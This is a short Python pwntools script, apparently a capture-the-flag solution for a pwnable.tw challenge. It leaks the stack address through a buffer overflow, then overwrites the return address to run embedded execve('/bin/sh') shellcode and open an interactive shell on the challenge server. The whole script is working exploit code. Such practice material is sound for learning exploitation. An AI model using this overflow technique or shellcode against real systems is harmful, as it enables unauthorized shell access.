from pwn import *
p = remote("chall.pwnable.tw", 10000)
raw_input("DEBUG")
p.recvuntil("Let's start the CTF:")

shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = b"A"*20
payload += p32(0x08048087)

p.send(payload)

esp_leaked = u32(p.recv()[:4])
print(hex(esp_leaked))
payload = b"A"*20
payload += p32(esp_leaked+0x14)

payload += shellcode 
p.sendline(payload)
p.interactive()
